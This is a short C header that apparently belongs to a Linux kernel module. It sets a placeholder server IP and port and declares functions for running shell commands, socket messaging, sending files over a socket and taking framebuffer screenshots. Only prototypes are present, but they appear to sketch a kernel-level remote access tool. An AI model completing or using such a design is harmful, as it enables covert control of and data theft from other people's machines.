#ifndef __FUNCTIONS_H__
#define __FUNCTIONS_H__

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/net.h>
#include <linux/socket.h>
#include <linux/inet.h>
#include <linux/string.h>
#include <linux/file.h>
#include <linux/fb.h>
#include <linux/fs.h>
#include <linux/mm.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/sched.h>
#include <linux/delay.h>

#define SERVER_IP "SERVER_IP"
#define SERVER_PORT PORT
#define BUFFER_SIZE 1024

int execute_shell_command(char *cmd);
int send_message(struct socket *sock, const char *message);
int receive_message(struct socket *sock, char *buffer, int buffer_size);
int read_file(struct socket *sock, char *filename);
int screenshot_ppm(void);

#endif
